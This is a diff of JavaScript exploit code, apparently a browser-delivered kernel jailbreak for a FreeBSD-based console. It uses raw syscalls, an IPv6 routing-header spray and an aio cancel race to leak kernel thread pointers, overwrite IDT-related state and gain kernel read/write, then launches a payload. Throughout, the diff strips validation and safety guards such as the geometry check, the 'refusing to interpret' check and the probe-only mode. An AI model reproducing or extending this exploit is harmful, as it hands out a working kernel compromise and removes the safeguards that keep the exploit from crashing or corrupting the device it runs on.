-                path + " HTTP " + response.status,
-              );
-            }
-
-            return new Uint8Array(
-              await response.arrayBuffer(),
-            );
-          },
-        });
-
-        allDone = true;
-        finishUI(hxOk === true);
-      } catch (hxError) {
-        mark(
-          "HX1400-THREW",
-          hxError && hxError.message
-            ? hxError.message
-            : String(hxError),
-        );
-
-        allDone = true;
-        finishUI(false);
-      }
-
-      return;
-    }
-
-const pid = sc(SYS.getpid).i32;
+    const pid = sc(SYS.getpid).i32;
     check(
       "chain-reaches-kernel",
       pid > 0,
       "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
     );
-
-    if (SKIPJB) {
-      const SETUID = 23;
-      if (!stubAddr.has(SETUID))
-        for (let o = 0; o < off.k_scan_stage1; o += 16) {
-          const v = p.read8(libkernelBase.add32(o));
-          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
-            continue;
-          if (
-            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
-            SETUID
-          ) {
-            stubAddr.set(SETUID, libkernelBase.add32(o));
-            break;
-          }
-        }
-      if (!stubAddr.has(SETUID)) {
-        mark("JB-PROBE", "stub=absent skip=impossible");
-      } else {
-        const suRv = sc(SETUID, 0).i32;
-        const uidNow = sc(SYS.getuid).i32;
-        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
-        if (suRv === 0 && uidNow === 0) {
-          jailbroken = true;
-          mark(
-            "JB-ALREADY",
-            "kernel already patched -- 663 race skipped, pid=" + pid,
-          );
-          if (DO_PAYLOAD) await relaunchPayload();
-          mark(
-            "EG-VERDICT",
-            "fw=" +
-              fwKey +
-              " jailbroken=1 kpatched=already payload_running=" +
-              (payloadRunning ? 1 : 0) +
-              " armings=0 reused=1",
-          );
-          allDone = true;
-          return;
-        }
-      }
-    }
 
     const scratchAb = new ArrayBuffer(0x1000);
     keepAlive.push(scratchAb);
@@ -1367,14 +603,11 @@ const pid = sc(SYS.getpid).i32;
       SOCK_DGRAM = 2,
       AF_UNIX = 1,
       SOCK_STREAM = 1;
-    const numArg = parseInt(params.get("num") || "", 10);
-    const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
-    const RTH_N = NUM > 2 ? 16 : 4;
-    const RTH_SIZE = 16 * RTH_N + 8,
-      RTH_LEN = 2 * RTH_N,
-      RTH_SEGLEFT = RTH_N;
-    const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
-      NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
+    const RTH_SIZE = 0x48,
+      RTH_LEN = 8,
+      RTH_SEGLEFT = 4;
+    const NODE0_DEC = 0x04000800,
+      SCRATCH_PAGE = 0x04000000;
     const SYS_MMAP = 477;
     const PROT_RW = 3,
       MAP_PRIVATE = 2,
@@ -1386,21 +619,7 @@ const pid = sc(SYS.getpid).i32;
     const SPIN = params.get("spin")
       ? parseInt(params.get("spin"), 10)
       : 40000000;
-    const CUT = params.get("cut") !== "0";
-    const CUT_MARGIN = params.get("cutmargin")
-      ? parseInt(params.get("cutmargin"), 10)
-      : 8192;
-    mark(
-      "PR-CFG",
-      "nleak=" +
-        N_LEAK +
-        " spray=" +
-        SPRAY +
-        " spin=" +
-        SPIN +
-        " cut=" +
-        (CUT ? CUT_MARGIN : 0),
-    );
+    mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
 
     async function bringWorker(name) {
       const w = { name: name, armed: false, wired: false };
@@ -1471,49 +690,6 @@ const pid = sc(SYS.getpid).i32;
         sc(SYS.getpid).i32,
     );
 
-    const zoneOf = (s) => {
-      const r = s & 15 ? (s + 16) & ~15 : s;
-      let z = 16;
-      while (z < r) z <<= 1;
-      return z;
-    };
-    const geomOk =
-      RTH_SIZE === 8 * (RTH_LEN + 1) &&
-      (RTH_LEN & 1) === 0 &&
-      RTH_LEN !== 0 &&
-      RTH_SEGLEFT === RTH_LEN / 2 &&
-      NODE0_DEC === (((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0) &&
-      NODE0_DEC >= SCRATCH_PAGE &&
-      NODE0_DEC < SCRATCH_PAGE + 0x10000 - 4 &&
-      !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) &&
-        NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) + RTH_SIZE) &&
-      zoneOf(NUM * 0x38) === zoneOf(RTH_SIZE);
-    if (
-      !check(
-        "pr-geometry-consistent",
-        geomOk,
-        "num=" +
-          NUM +
-          " victim=0x" +
-          (NUM * 0x38).toString(16) +
-          " rth=0x" +
-          RTH_SIZE.toString(16) +
-          " len=" +
-          RTH_LEN +
-          " segleft=" +
-          RTH_SEGLEFT +
-          " zone=" +
-          zoneOf(NUM * 0x38) +
-          "/" +
-          zoneOf(RTH_SIZE) +
-          " scratch=0x" +
-          SCRATCH_PAGE.toString(16) +
-          " node0_dec=0x" +
-          NODE0_DEC.toString(16),
-      )
-    )
-      return;
-
     const mr = sc(
       SYS_MMAP,
       SCRATCH_PAGE,
@@ -1545,7 +721,7 @@ const pid = sc(SYS.getpid).i32;
       tDv.setUint8(1, RTH_LEN);
       tDv.setUint8(3, RTH_SEGLEFT);
       sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
-      const RT = SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000);
+      const RT = SCRATCH_PAGE + 0x2000;
       lenDv.setUint32(0, RTH_SIZE, true);
       lenDv.setUint32(4, 0, true);
       const g1 = sc(
@@ -1574,7 +750,7 @@ const pid = sc(SYS.getpid).i32;
         return;
     }
 
-    const mAb = new ArrayBuffer(0xc0);
+    const mAb = new ArrayBuffer(0x40);
     keepAlive.push(mAb);
     const mU32 = new Uint32Array(mAb);
     keepAlive.push(mU32);
@@ -1654,43 +830,29 @@ const pid = sc(SYS.getpid).i32;
       )
     )
       return;
-    const coreArg = params.get("core")
+    const PINCORE = params.get("core")
       ? parseInt(params.get("core"), 10)
-      : -1;
-    const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
-    let PINCORE = -1,
-      affSet = -1,
-      backMask = 0;
-    for (const c of candidates) {
-      new Uint8Array(mskAb).fill(0);
-      mskDv.setUint32(0, (1 << c) >>> 0, true);
-      affSet = sc(
-        SYS.cpuset_setaffinity,
-        CPU_LEVEL_WHICH,
-        CPU_WHICH_TID,
-        ID64,
-        CPUSET_SZ,
-        mskAd,
-      ).i32;
-      new Uint8Array(mskAb).fill(0);
-      sc(
-        SYS.cpuset_getaffinity,
-        CPU_LEVEL_WHICH,
-        CPU_WHICH_TID,
-        ID64,
-        CPUSET_SZ,
-        mskAd,
-      );
-      backMask = mskDv.getUint32(0, true) >>> 0;
-      if (affSet === 0 && backMask === (1 << c) >>> 0) {
-        PINCORE = c;
-        break;
-      }
-      mark(
-        "PIN-REJECT",
-        "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
-      );
-    }
+      : cores[0];
+    new Uint8Array(mskAb).fill(0);
+    mskDv.setUint32(0, (1 << PINCORE) >>> 0, true);
+    const affSet = sc(
+      SYS.cpuset_setaffinity,
+      CPU_LEVEL_WHICH,
+      CPU_WHICH_TID,
+      ID64,
+      CPUSET_SZ,
+      mskAd,
+    ).i32;
+    new Uint8Array(mskAb).fill(0);
+    sc(
+      SYS.cpuset_getaffinity,
+      CPU_LEVEL_WHICH,
+      CPU_WHICH_TID,
+      ID64,
+      CPUSET_SZ,
+      mskAd,
+    );
+    const backMask = mskDv.getUint32(0, true) >>> 0;
     mark(
       "PIN-SET",
       "core=" +
@@ -1698,15 +860,12 @@ const pid = sc(SYS.getpid).i32;
         " rv=" +
         affSet +
         " reads back 0x" +
-        backMask.toString(16) +
-        " tried=" +
-        candidates.join(","),
+        backMask.toString(16),
     );
-    if (PINCORE < 0 && retryBenign("pin-failed")) return;
     if (
       !check(
         "MAIN-PINNED",
-        PINCORE >= 0,
+        affSet === 0 && backMask === (1 << PINCORE) >>> 0,
         "core=" +
           PINCORE +
           " mask=0x" +
@@ -1716,96 +875,48 @@ const pid = sc(SYS.getpid).i32;
     )
       return;
 
-    const otherCores = cores.filter((c) => c !== PINCORE);
+    const OTHER =
+      cores.length > 1
+        ? cores[0] === PINCORE
+          ? cores[cores.length - 1]
+          : cores[0]
+        : PINCORE;
     const msk2Ab = new ArrayBuffer(CPUSET_SZ);
     keepAlive.push(msk2Ab);
     const msk2Dv = new DataView(msk2Ab),
       msk2Ad = bufAddr(msk2Ab);
-    const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
-    async function pinWorker(w, c) {
-      new Uint8Array(msk2Ab).fill(0);
-      msk2Dv.setUint32(0, (1 << c) >>> 0, true);
-      await w.fire(SYS.cpuset_setaffinity, aw);
-      const rv = w.ctx.frameDv.getUint32(0, true) | 0;
-      new Uint8Array(msk2Ab).fill(0);
-      await w.fire(SYS.cpuset_getaffinity, aw);
-      const back = msk2Dv.getUint32(0, true) >>> 0;
-      return { rv: rv, back: back, ok: rv === 0 && back === (1 << c) >>> 0 };
-    }
-    let OTHER = -1,
-      wpin = "none";
-    for (let i = otherCores.length - 1; i >= 0; i--) {
-      const c = otherCores[i];
-      const p1 = await pinWorker(w1, c);
-      if (!p1.ok) {
-        mark(
-          "PIN-WREJECT",
-          "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
-        );
-        continue;
-      }
-      const p2 = await pinWorker(w2, c);
-      if (!p2.ok) {
-        mark(
-          "PIN-WREJECT",
-          "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
-        );
-        continue;
-      }
-      OTHER = c;
-      wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
-      break;
-    }
-    mark(
-      "PIN-WSET",
-      "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
-    );
-    if (
-      !check(
+    new Uint8Array(msk2Ab).fill(0);
+    msk2Dv.setUint32(0, (1 << OTHER) >>> 0, true);
+    let wpin = "skipped";
+    if (OTHER !== PINCORE) {
+      const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
+      await w1.fire(SYS.cpuset_setaffinity, aw);
+      const r1 = w1.ctx.frameDv.getUint32(0, true) | 0;
+      await w2.fire(SYS.cpuset_setaffinity, aw);
+      const r2 = w2.ctx.frameDv.getUint32(0, true) | 0;
+      wpin = "w1=" + r1 + " w2=" + r2;
+      check(
         "WORKERS-PINNED",
-        OTHER >= 0,
+        r1 === 0 && r2 === 0,
         "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
-      )
-    ) {
-      mark(
-        "PIN-REFUSE",
-        "no worker core verifies apart from main=" +
-          PINCORE +
-          "; sharing it is the configuration that hangs",
       );
-      return;
+    } else {
+      mark("PIN-ONE-CORE", "only one core available, workers share it");
     }
     mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
 
     pinRestore = function () {
-      const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
-      function apply(m) {
-        new Uint8Array(mskAb).fill(0);
-        mskDv.setUint32(0, m, true);
-        return sc(
-          SYS.cpuset_setaffinity,
-          CPU_LEVEL_WHICH,
-          CPU_WHICH_TID,
-          ID64,
-          CPUSET_SZ,
-          mskAd,
-        ).i32;
-      }
-      let used = savedMask,
-        r = apply(savedMask);
-      if (r !== 0 && permitted !== savedMask) {
-        used = permitted;
-        r = apply(permitted);
-      }
-      mark(
-        "PIN-RESTORED",
-        "rv=" +
-          r +
-          " mask=0x" +
-          used.toString(16) +
-          " saved=0x" +
-          savedMask.toString(16),
-      );
+      new Uint8Array(mskAb).fill(0);
+      mskDv.setUint32(0, savedMask, true);
+      const r = sc(
+        SYS.cpuset_setaffinity,
+        CPU_LEVEL_WHICH,
+        CPU_WHICH_TID,
+        ID64,
+        CPUSET_SZ,
+        mskAd,
+      ).i32;
+      mark("PIN-RESTORED", "rv=" + r + " mask=0x" + savedMask.toString(16));
     };
 
     mark(
@@ -1833,21 +944,20 @@ const pid = sc(SYS.getpid).i32;
     opened.push(sp0, sp1);
     const rbAb = new ArrayBuffer(0x40);
     keepAlive.push(rbAb);
-    const rqAb = new ArrayBuffer(NUM * 0x28);
+    const rqAb = new ArrayBuffer(0x50);
     keepAlive.push(rqAb);
     const rqDv = new DataView(rqAb);
-    for (let k = 0; k < NUM; k++) {
+    for (let k = 0; k < 2; k++) {
       const b = k * 0x28;
       put(rqDv, b + 0x08, 0x40);
       put(rqDv, b + 0x10, bufAddr(rbAb));
       rqDv.setInt32(b + 0x20, sp0, true);
     }
-    const idAb2 = new ArrayBuffer(NUM * 4);
+    const idAb2 = new ArrayBuffer(8);
     keepAlive.push(idAb2);
     const idAd2 = bufAddr(idAb2);
-    const stAb2 = new ArrayBuffer(NUM * 4);
+    const stAb2 = new ArrayBuffer(8);
     keepAlive.push(stAb2);
-    const stDv2 = new DataView(stAb2);
     const stAd2 = bufAddr(stAb2);
     const toAb = new ArrayBuffer(8);
     keepAlive.push(toAb);
@@ -1873,10 +983,7 @@ const pid = sc(SYS.getpid).i32;
       POOL.push(fd);
       opened.push(fd);
     }
-    mark(
-      "PR-POOL",
-      "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
-    );
+    mark("PR-POOL", "reclaim sockets=" + POOL.length);
     const pAb = new ArrayBuffer(RTH_SIZE);
     keepAlive.push(pAb);
     const pDv = new DataView(pAb),
@@ -1889,20 +996,6 @@ const pid = sc(SYS.getpid).i32;
       put(pDv, 0x10, M_AD);
       put(pDv, 0x30, nextAddr);
     }
-
-    const N0DEC = params.get("n0dec") !== "0";
-    const SOL_SOCKET = 0xffff,
-      SO_TYPE = 0x1008;
-    const n0dAb = new ArrayBuffer(8);
-    keepAlive.push(n0dAb);
-    const n0dDv = new DataView(n0dAb),
-      n0dAd = bufAddr(n0dAb);
-    function presetNode0Dec() {
-      n0dDv.setUint32(0, 4, true);
-      n0dDv.setUint32(4, 0, true);
-      return sc(SYS.getsockopt, POOL[0], SOL_SOCKET, SO_TYPE, NODE0_DEC, n0dAd)
-        .i32;
-    }
     let armCount = 0;
     let waitMs = -1;
 
@@ -1910,26 +1003,7 @@ const pid = sc(SYS.getpid).i32;
     const REAP = params.get("reap") !== "0";
     const REAPLEAK = params.get("reapleak") !== "0";
     const PARK = params.get("park") === "1";
-    const LEAKRETRY = params.get("leakretry") === "1";
-    const TRACEARM1 = params.get("tracearm1") === "1";
-    if (NUM > 2 && !(REAP && REAPLEAK)) {
-      mark("PR-REFUSE", "num=" + NUM + " needs reap=1 reapleak=1");
-      return;
-    }
-    let FAKEMISS = params.has("fakemiss")
-      ? parseInt(params.get("fakemiss"), 10)
-      : -1;
-    if (FAKEMISS >= 4) {
-      mark("PR-FAKEMISS-REFUSED", "arming=" + FAKEMISS + " writes_kernel");
-      FAKEMISS = -1;
-    }
-    if (FAKEMISS >= 0)
-      mark(
-        "PR-FAKEMISS",
-        "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1",
-      );
     let reapedGen = -1;
-    let reapAt = 0;
     function armOnce() {
       try {
         if (typeof A !== "undefined" && A) A.busy = 1;
@@ -1947,7 +1021,7 @@ const pid = sc(SYS.getpid).i32;
         SYS.aio_submit_cmd,
         1 | 0x1000,
         bufAddr(rqAb),
-        NUM,
+        2,
         3,
         idAd2,
       ).i32;
@@ -1968,9 +1042,9 @@ const pid = sc(SYS.getpid).i32;
           toAd,
       );
       const tw0 = Date.now();
-      sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
-      armedEver = true;
+      sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
       waitMs = Date.now() - tw0;
+      at("ARM-P4-SPRAY", "wait=" + waitMs + "ms");
       let n = 0;
       for (const fd of POOL)
         if (
@@ -1987,9 +1061,6 @@ const pid = sc(SYS.getpid).i32;
     keepAlive.push(lkNodes);
     const lkNdv = new DataView(lkNodes),
       lkNad = bufAddr(lkNodes);
-    const lkF64 = new Float64Array(lkNodes);
-    const NEXT_F64 = 0x30 / 8,
-      STRIDE_F64 = NODE_SZ / 8;
     async function leakCurthread(w) {
       toDv.setUint32(0, TOWAIT, true);
       toDv.setUint32(4, 0, true);
@@ -2006,11 +1077,6 @@ const pid = sc(SYS.getpid).i32;
       mU32[6] = 4;
       mU32[7] = 0;
       setNode0(lkNad, LC);
-      if (N0DEC) {
-        const pr0 = presetNode0Dec();
-        mark("PR-N0DEC", "rv=" + pr0 + " at=0x" + NODE0_DEC.toString(16));
-        if (pr0 !== 0) return null;
-      }
       const a = armOnce();
       if (a.indexOf("ok") !== 0) {
         mark("PR-LEAK-ARM", w.name + " " + a);
@@ -2020,7 +1086,7 @@ const pid = sc(SYS.getpid).i32;
       {
         let wu = 0;
         for (let i = 0; i < 200000; i++) {
-          mU8[0x80 + (i & 15)] = i & 0xff;
+          mU8[0x30 + (i & 15)] = i & 0xff;
           wu ^= mU32[OWNER_LO];
         }
         if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
@@ -2034,7 +1100,7 @@ const pid = sc(SYS.getpid).i32;
         pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
       } catch (e) {}
       for (let i = 0; i < SPIN; i++) {
-        mU8[0x80 + (i & 15)] = i & 0xff;
+        mU8[0x30 + (i & 15)] = i & 0xff;
         const hi1 = mU32[OWNER_HI];
         if (hi1 !== 0) {
           const lo = mU32[OWNER_LO];
@@ -2056,20 +1122,6 @@ const pid = sc(SYS.getpid).i32;
         }
       }
       const drop = 0x40000000 - lkDv.getInt32(0x00, true);
-      let cutAt = -1,
-        cutTries = 0;
-      if (CUT) {
-        for (let m = CUT_MARGIN; m <= CUT_MARGIN << 3; m <<= 1) {
-          const at = 0x40000000 - lkDv.getInt32(0x00, true) + m;
-          if (at >= N_LEAK - 1) break;
-          cutTries++;
-          lkF64[at * STRIDE_F64 + NEXT_F64] = 0;
-          if (0x40000000 - lkDv.getInt32(0x00, true) < at) {
-            cutAt = at;
-            break;
-          }
-        }
-      }
       const uniq = {};
       for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
       const keys = Object.keys(uniq);
@@ -2090,49 +1142,22 @@ const pid = sc(SYS.getpid).i32;
       try {
         if (pr) await pr;
       } catch (e) {}
-      mark(
-        "PR-WALK-DONE",
-        w.name +
-          " walked=" +
-          (0x40000000 - lkDv.getInt32(0x00, true)) +
-          "/" +
-          N_LEAK +
-          " broke_at=" +
-          drop +
-          " cut=" +
-          cutAt +
-          " tries=" +
-          cutTries,
-      );
       if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
       return new int64(hitLo >>> 0, hitHi >>> 0);
     }
-    if (TRACEARM1) armTrace = true;
     const CT1 = await leakCurthread(w1);
     armTrace = true;
 
-    put(lkNdv, 0x00, LX);
-    put(lkNdv, 0x08, LC);
-    put(lkNdv, 0x30, 0);
     if (REAPLEAK) {
-      mark("PR-REAPLEAK-PRE", "node0 next=0 num=" + NUM);
-      const rlc = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
-      mark("PR-REAPLEAK-C", "cancel=" + rlc);
-      const rlp = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
-      mark("PR-REAPLEAK-P", "poll=" + rlp);
-      const rld = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
+      put(lkNdv, 0x00, LX);
+      put(lkNdv, 0x08, LC);
+      put(lkNdv, 0x30, 0);
+      const rlc = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
+      const rlp = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
+      const rld = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
       mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
-      reapAt = Date.now();
     } else {
       mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
-    }
-
-    if (!CT1) {
-      mark("PR-LEAK-MISS", "ct1=null leakretry=" + (LEAKRETRY ? 1 : 0));
-      neutralise("leak-miss", 0);
-      if (LEAKRETRY && REAPLEAK && retryBenign("leak-miss")) return;
-      check("pointer-read-reached", false, "no curthread leak");
-      return;
     }
 
     mark(
@@ -2226,46 +1251,7 @@ const pid = sc(SYS.getpid).i32;
       put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
     }
 
-    let lastFire = {
-      n0: 0,
-      fsock: -1,
-      fhits: 0,
-      faked: false,
-      label: "none",
-    };
-
-    function neutralise(where, sink) {
-      setNode0(0, sink);
-      let renew = 0;
-      for (const fd of POOL)
-        if (
-          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
-            .i32 === 0
-        )
-          renew++;
-      mark(
-        "PR-NEUTRALISE-EARLY",
-        where + " next=0 on " + renew + "/" + POOL.length,
-      );
-    }
-
-    function fireOk(where) {
-      if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
-      mark(
-        "REFUSING-TO-INTERPRET",
-        where +
-          " node0_sink=" +
-          lastFire.n0 +
-          " f_socket=" +
-          lastFire.fsock +
-          " forced=" +
-          (lastFire.faked ? 1 : 0),
-      );
-      neutralise(where, N0SINK);
-      return false;
-    }
-
-    const gfAb = new ArrayBuffer(RTH_SIZE);
+    const gfAb = new ArrayBuffer(0x80);
     keepAlive.push(gfAb);
     const gfDv = new DataView(gfAb),
       gfAd = bufAddr(gfAb);
@@ -2302,21 +1288,9 @@ const pid = sc(SYS.getpid).i32;
       if (!REAP || reapedGen === armCount) return;
       wnode(0, DUM, DUM, true);
       reapedGen = armCount;
-      const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
-      let stsC = "";
-      for (let k = 0; k < NUM; k++)
-        stsC +=
-          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-      const p = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
-      let stsP = "";
-      for (let k = 0; k < NUM; k++)
-        stsP +=
-          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-      const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
-      let sts = "";
-      for (let k = 0; k < NUM; k++)
-        sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
-      reapAt = Date.now();
+      const c = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
+      const p = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
+      const d = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
       post(
         "REAP",
         tag +
@@ -2327,24 +1301,9 @@ const pid = sc(SYS.getpid).i32;
           " poll=" +
           p +
           " delete=" +
-          d +
-          " c=[" +
-          stsC +
-          "] p=[" +
-          stsP +
-          "] st=[" +
-          sts +
-          "]",
+          d,
       );
     }
-
-    const firesArg = parseInt(params.get("fires") || "", 10);
-    const FIRES =
-      Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
-        ? firesArg
-        : NUM - 1;
-    let fireIdx = FIRES;
-    mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);
 
     function runChain(nNodes, label) {
       snkDv.setInt32(0x00, 0x40000000, true);
@@ -2361,48 +1320,18 @@ const pid = sc(SYS.getpid).i32;
       );
       mU32[OWNER_LO] = 4;
       mU32[OWNER_HI] = 0;
-      let a = "ok reused";
-      if (fireIdx >= FIRES) {
-        const n0save = arAb.slice(0, NODE_SZ);
-        reapNow("pre-arm a=" + armCount);
-        new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
-        setNode0(arAd, N0SINK);
-        a = armOnce();
-        if (a.indexOf("ok") !== 0) {
-          mark("PR-ARM-FAIL", label + " " + a);
-          return null;
-        }
-        fireIdx = 0;
-      } else {
-        setNode0(arAd, N0SINK);
+      setNode0(arAd, N0SINK);
+      const a = armOnce();
+      if (a.indexOf("ok") !== 0) {
+        mark("PR-ARM-FAIL", label + " " + a);
+        return null;
       }
-      const fireN = fireIdx;
-      sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
-      fireIdx++;
-      trace(
-        "CH-CANCEL-DONE",
-        label +
-          " nodes=" +
-          nNodes +
-          " fire=" +
-          fireN +
-          "/" +
-          FIRES +
-          " arm=" +
-          armCount +
-          " returned",
-      );
+      trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
+      sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
+      trace("CH-CANCEL-DONE", label + " returned");
       const moved = 0x40000000 - snkDv.getInt32(0x00, true);
+      const n0 = 0x40000000 - snkDv.getInt32(0x20, true);
       const w = whoHasF();
-      const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
-      const n0 = faked ? 0 : 0x40000000 - snkDv.getInt32(0x20, true);
-      lastFire = {
-        n0: n0,
-        fsock: w.idx,
-        fhits: w.hits,
-        faked: faked,
-        label: label,
-      };
       mark(
         "PR-FIRE",
         label +
@@ -2412,8 +1341,6 @@ const pid = sc(SYS.getpid).i32;
           moved +
           " node0_sink=" +
           n0 +
-          " forced=" +
-          (faked ? 1 : 0) +
           " f_socket=" +
           w.idx +
           " f_hits=" +
@@ -2430,6 +1357,7 @@ const pid = sc(SYS.getpid).i32;
           "node0 fired but no pool socket carries the" +
             " state write -- F went to something outside the pool",
         );
+      reapNow("a=" + armCount);
       return moved;
     }
 
@@ -2481,7 +1409,6 @@ const pid = sc(SYS.getpid).i32;
       }
       const mA = runChain(i, "passA");
       if (mA === null) return;
-      if (!fireOk("passA")) return;
       if (mA <= 0) {
         mark(
           "PR-PASSA-NOCROSS",
@@ -2581,7 +1508,6 @@ const pid = sc(SYS.getpid).i32;
       }
       const mB = runChain(i, "passB");
       if (mB === null) return;
-      if (!fireOk("passB")) return;
       if (mB <= 0) {
         mark(
           "PR-PASSB-NOCROSS",
@@ -2630,14 +1556,6 @@ const pid = sc(SYS.getpid).i32;
     // kernel, so from here a failure must NOT auto-reload. Reset the counter
     // so the next manual run starts fresh.
     clearRetry();
-
-    if (PROBE_MODE) {
-      mark(
-        "PROBE-DONE",
-        "leak primitive validated on this FW - kernel bug is ALIVE; stopping before any kernel write",
-      );
-      return;
-    }
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
@@ -2801,7 +1719,6 @@ const pid = sc(SYS.getpid).i32;
       }
       put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
       if (runChain(idx, "anchor-sweep") === null) return;
-      if (!fireOk("anchor-sweep")) return;
     }
 
     function simPattern(bv, low) {
@@ -2965,7 +1882,6 @@ const pid = sc(SYS.getpid).i32;
       for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
-      if (!fireOk(label)) return null;
       const m = 0x40000000 - sDv.getInt32(0, true);
       return { m: m, v: m > 0 ? n - m + 1 : 0 };
     }
@@ -2983,7 +1899,6 @@ const pid = sc(SYS.getpid).i32;
       }
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
-      if (!fireOk(label)) return null;
       let obs = "";
       for (let k = 0; k < SWEEP; k++)
         obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
@@ -3174,7 +2089,6 @@ const pid = sc(SYS.getpid).i32;
         });
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
-      if (!fireOk(label)) return null;
       const out = [];
       for (let q = 0; q < jobs.length; q++) {
         const j = jobs[q];
@@ -3200,7 +2114,6 @@ const pid = sc(SYS.getpid).i32;
     if (kfSock >= 0) {
       opened.push(kfSock);
       const tAb = new ArrayBuffer(4);
-      keepAlive.push(tAb);
       const tDv = new DataView(tAb);
       tDv.setInt32(0, KF_MARK, true);
       sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
@@ -3311,16 +2224,6 @@ const pid = sc(SYS.getpid).i32;
           i,
       );
       if (runChain(i, "restore+unhide+caps") === null) return;
-      if (!fireOk("restore+unhide+caps")) {
-        if (lastFire.n0 === 1) {
-          capsWrote = capsPend;
-          mark(
-            "CAPS-WROTE-UNVERIFIED",
-            "caps=" + capsPend + " f_socket=" + lastFire.fsock,
-          );
-        }
-        return;
-      }
       capsWrote = capsPend;
     }
     mark(
@@ -3441,8 +2344,6 @@ const pid = sc(SYS.getpid).i32;
         if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
           allDone = true;
         } else if (runChain(i, "krw-setup") === null) {
-          allDone = true;
-        } else if (!fireOk("krw-setup")) {
           allDone = true;
         } else {
           const kmAb = new ArrayBuffer(8);
@@ -4408,7 +3309,6 @@ const pid = sc(SYS.getpid).i32;
     }
     allDone = true;
 
-    reapNow("final a=" + armCount);
     setNode0(0, N0SINK);
     let renew = 0;
     for (const fd of POOL)
@@ -4428,75 +3328,9 @@ const pid = sc(SYS.getpid).i32;
         "  (workers deliberately NOT terminated: their td_proc is corrupt" +
         " and terminate() would make them syscall)",
     );
-
-    const drWbAb = new ArrayBuffer(NBLOCK * 0x40);
-    keepAlive.push(drWbAb);
-    const drStAb = new ArrayBuffer(NBLOCK * 4);
-    keepAlive.push(drStAb);
-    const drStDv = new DataView(drStAb);
-    const drStAd = bufAddr(drStAb);
-    const drBidAd = bufAddr(bidAb);
-
